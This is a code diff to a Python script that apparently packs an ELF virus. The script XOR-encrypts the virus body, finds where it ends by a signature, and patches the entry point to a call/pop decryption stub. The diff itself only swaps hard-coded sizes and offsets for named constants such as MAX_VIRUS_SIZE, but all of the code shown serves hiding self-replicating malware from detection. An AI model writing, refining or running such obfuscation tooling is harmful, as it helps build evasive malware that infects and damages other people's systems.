@@ -10,7 +10,14 @@ import os
 import struct
 import random
 
-def generate_key(length=16):
+# Constants
+XOR_KEY_LENGTH = 16
+MAX_VIRUS_SIZE = 16384  # Maximum expected virus code size
+SIGNATURE_TO_VIRUS_END_BUFFER = 4000  # Buffer after signature to cover remaining code
+MAX_SECTION_SIZE = 32768  # Sanity check for encrypted section size
+ELF_TEXT_SECTION_OFFSET = 0x1000  # Standard .text section offset in linked ELF binaries
+
+def generate_key(length=XOR_KEY_LENGTH):
     """Generate a random XOR key"""
     return bytes([random.randint(1, 255) for _ in range(length)])
 
@@ -53,10 +60,10 @@ def find_virus_end(binary_data, start_offset):
     if sig_pos != -1:
         # virus_end is shortly after the signature and its length byte
         # Add buffer for remaining code (virus functions)
-        return sig_pos + len(signature) + 4000
+        return sig_pos + len(signature) + SIGNATURE_TO_VIRUS_END_BUFFER
     
     # Fallback: use a reasonable max size
-    return start_offset + 16384
+    return start_offset + MAX_VIRUS_SIZE
 
 def xor_encrypt(data, key):
     """XOR encrypt/decrypt data with key (key is repeated as needed)"""
@@ -129,8 +136,8 @@ def patch_entry_point_to_virus_start(binary_data):
     # Machine code: e8 00 00 00 00 58 (call with 0 offset, then pop rax)
     stub_pattern = b'\xe8\x00\x00\x00\x00\x58'
     
-    # Search in the .text section (starting from file offset 0x1000)
-    text_offset = 0x1000
+    # Search in the .text section (starting from standard ELF .text offset)
+    text_offset = ELF_TEXT_SECTION_OFFSET
     search_start = text_offset
     search_end = min(text_offset + 0x2000, len(binary_data))
     
@@ -197,7 +204,7 @@ def obfuscate_binary(input_path, output_path):
     section_size = encrypt_end - encrypt_start
     print(f"[*] Section to encrypt: {section_size} bytes (0x{section_size:x})")
     
-    if section_size <= 0 or section_size > 32768:
+    if section_size <= 0 or section_size > MAX_SECTION_SIZE:
         print(f"[!] Invalid section size: {section_size}")
         sys.exit(1)
     
